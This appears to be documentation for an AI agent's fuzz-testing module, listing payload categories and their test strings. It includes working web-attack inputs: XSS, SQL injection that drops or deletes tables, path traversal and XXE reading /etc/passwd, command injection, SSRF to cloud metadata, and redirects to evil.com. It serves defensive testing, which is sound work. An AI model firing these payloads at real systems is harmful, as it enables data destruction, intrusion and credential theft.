# AI Agent — Fuzz Categories

## Security Fuzz Categories

| Category | Payloads | What it finds |
|----------|----------|---------------|
| XSS | 4 payloads | Reflected XSS, cookie stealing |
| SQL Injection | 4 payloads | SQL errors, data exposure |
| Path Traversal | 4 payloads | File system access |
| Command Injection | 4 payloads | OS command execution |
| NoSQL Injection | 4 payloads | Database bypass |
| SSRF | 4 payloads | Internal service access |
| Open Redirect | 5 payloads | Phishing redirects |
| SSTI | 6 payloads | Template injection, RCE |
| XXE | 2 payloads | XML external entity attacks |
| Empty/Null | 5 payloads | Null handling bugs |
| Boundary | 5 payloads | Edge case crashes |
| Type Confusion | 8 payloads | Type mismatch errors |

### XSS Payloads
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`

### SQL Injection Payloads
- `' OR '1'='1`
- `'; DROP TABLE users; --`
- `' UNION SELECT * FROM users--`
- `1; DELETE FROM users`

### Path Traversal Payloads
- `../../../etc/passwd`
- `..\..\..\windows\system32\config\sam`
- `....//....//etc/passwd`
- `..%252f..%252fetc/passwd`

### Command Injection Payloads
- `; ls -la`
- `| cat /etc/passwd`
- `$(whoami)`
- `` `id` ``

### NoSQL Injection Payloads
- `{"$ne": null}`
- `{"$gt": ""}`
- `{"username": {"$regex": ".*"}}`
- `{"$where": "1==1"}`

### SSRF Payloads
- `http://127.0.0.1:8080/admin`
- `http://localhost:27017`
- `http://169.254.169.254/latest/meta-data/`
- `file:///etc/passwd`

### Open Redirect Payloads
- `//evil.com`
- `http://evil.com`
- `https://evil.com`
- `//attacker.com`
- `///evil.com`

### SSTI Payloads
- `{{7*7}}`
- `${7*7}`
- `#{7*7}`
- `<%= 7*7 %>`
- `{{config}}`
- `{{self}}`

### XXE Payloads
- `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>`
- `<?xml version='1.0'?><!DOCTYPE foo SYSTEM 'file:///etc/passwd'>`

### Empty/Null Payloads
- `""`
- `"   "`
- `None`
- `"null"`
- `"NULL"`

### Boundary Payloads
- `""`
- `"0"`
- `"1"`
- `"-1"`
- `"999999999999"`

### Type Confusion Payloads
- `1` (int)
- `"1"` (string)
- `True` (bool)
- `False` (bool)
- `[]` (list)
- `{}` (dict)
- `1.5` (float)
